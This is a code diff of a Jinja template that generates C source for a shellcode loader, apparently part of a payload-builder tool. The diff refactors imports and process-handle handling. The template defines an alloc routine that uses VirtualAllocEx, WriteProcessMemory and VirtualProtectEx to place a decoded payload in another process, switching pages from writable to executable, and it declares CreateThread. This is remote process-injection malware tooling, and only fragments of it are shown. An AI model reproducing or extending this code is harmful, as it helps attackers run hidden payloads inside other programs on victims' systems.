@@ -1,19 +1,17 @@
-{% if section == "globals" %}
-    {% if link.alloc.functions.value in ["dynamic", "direct"] %}
-        {{ function_typedef("VirtualAllocEx") }}
-        {{ function_typedef("WriteProcessMemory") }}
-        {{ function_typedef("VirtualProtectEx") }}
-        {{ function_typedef("CreateThread") }}
-    {% endif %}
+{% from "macros.jinja" import function_typedef, function_definition, createThreadStub with context %}
 
-    {% include "blocks/get_process_handle.jinja" %}
+{% if section == "globals" %}
+    {{ function_typedef("VirtualAllocEx") }}
+    {{ function_typedef("WriteProcessMemory") }}
+    {{ function_typedef("VirtualProtectEx") }}
+    {{ function_typedef("CreateThread") }}
 
     void *alloc(void *decoded, SIZE_T length, HANDLE hProc){
         {{ function_definition("VirtualAllocEx") }}
         {{ function_definition("WriteProcessMemory") }}
         {{ function_definition("VirtualProtectEx") }}
 
-        {% if link.alloc.protection == "rx" %}
+        {% if protection == "rx" %}
             LPVOID pRemoteCode = pVirtualAllocEx(
                 hProc, NULL, length, MEM_COMMIT, PAGE_READWRITE
             );
@@ -37,7 +35,5 @@
         return pRemoteCode;
     }
 {% else %}
-    {% include "blocks/get_process_handle.jinja" %}
-
     void *mem = alloc(raw, length, hProc);
 {% endif %}
